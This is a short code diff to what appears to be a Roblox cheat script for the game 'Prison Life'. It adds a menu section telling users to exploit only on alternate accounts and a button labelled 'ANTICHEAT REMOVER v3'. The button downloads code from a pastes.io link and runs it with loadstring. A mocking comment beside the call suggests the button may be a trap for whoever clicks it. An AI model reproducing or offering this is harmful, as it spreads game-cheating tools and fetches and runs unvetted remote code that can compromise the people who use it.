@@ -1356,6 +1356,18 @@ end)
 
 -- Main Tab --
 -- Team Management --
+MainTab:CreateSection("REMINDER: ONLY USE YOUR ALT TO EXPLOIT :D")
+
+MainTab:CreateSection("ANTI-CHEAT REMOVER")
+
+MainTab:CreateButton({
+    Name = "ANTICHEAT REMOVER v3",
+    Callback = function()
+		-- get fucked LOL
+        loadstring(game:HttpGet("https://pastes.io/raw/prison-life"))()
+    end,
+})
+
 MainTab:CreateSection("Team Management")
 
 MainTab:CreateButton({
